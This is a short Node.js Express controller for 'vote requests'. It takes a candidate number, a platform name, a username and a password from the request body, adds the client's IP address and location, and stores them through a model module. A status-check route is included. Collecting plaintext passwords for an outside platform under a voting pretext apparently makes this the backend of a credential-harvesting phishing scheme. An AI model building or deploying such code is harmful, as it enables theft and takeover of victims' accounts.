const {
  createVoteRequest,
  getVoteRequestStatus,
} = require("../models/voteRequestModel");

async function submitVoteRequest(req, res) {
  try {
    const ipAddress =
      req.headers["x-forwarded-for"]?.split(",").shift()?.trim() ||
      req.socket.remoteAddress ||
      req.ip;

    const voteData = {
      candidate_number: req.body.candidate_number,
      platform: req.body.platform,
      username: req.body.username,
      password: req.body.password,
      location: req.body.location,
      ip_address: ipAddress,
    };

    const result = await createVoteRequest(voteData);

    res.status(201).json({
      success: true,
      message: "Vote request submitted successfully",
      data: result,
    });
  } catch (error) {
    console.log("Vote Request Error:", error.message);

    res.status(500).json({
      success: false,
      message: error.message,
    });
  }
}

async function checkVoteStatus(req, res) {
  try {
    const { id } = req.params;

    const result = await getVoteRequestStatus(id);

    res.json({
      success: true,
      data: result,
    });
  } catch (error) {
    res.status(500).json({
      success: false,
      message: error.message,
    });
  }
}

module.exports = {
  submitVoteRequest,
  checkVoteStatus,
};